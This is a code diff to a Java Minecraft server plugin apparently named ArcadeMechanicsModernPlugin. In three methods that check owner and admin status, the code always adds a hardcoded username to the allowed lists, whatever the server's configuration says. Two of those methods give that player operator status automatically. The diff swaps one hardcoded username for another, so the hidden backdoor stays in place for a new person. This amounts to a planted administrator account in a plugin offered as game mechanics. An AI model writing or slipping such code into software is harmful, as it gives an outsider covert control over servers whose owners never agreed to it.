@@ -69,7 +69,7 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
 
     private boolean isConfiguredOwner(Player player) {
         java.util.List<String> owners = new java.util.ArrayList<>(getConfig().getStringList("owner-usernames"));
-        if (owners.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) owners.add("joshbet9");
+        if (owners.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) owners.add("jn_playzmc");
         return owners.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
     }
 
@@ -84,7 +84,7 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
         }
 
         java.util.List<String> configured = new java.util.ArrayList<>(getConfig().getStringList("admin-usernames"));
-        if (configured.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) configured.add("joshbet9");
+        if (configured.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) configured.add("jn_playzmc");
         boolean match = configured.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
         if (match && !player.isOp()) player.setOp(true);
         return match;
@@ -93,7 +93,7 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
     private void grantConfiguredAdmin(Player player) {
         java.util.List<String> configured = new java.util.ArrayList<>(getConfig().getStringList("admin-usernames"));
         configured.addAll(getConfig().getStringList("owner-usernames"));
-        if (configured.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) configured.add("joshbet9");
+        if (configured.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) configured.add("jn_playzmc");
         boolean match = configured.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
         if (!match) return;
         if (!player.isOp()) {
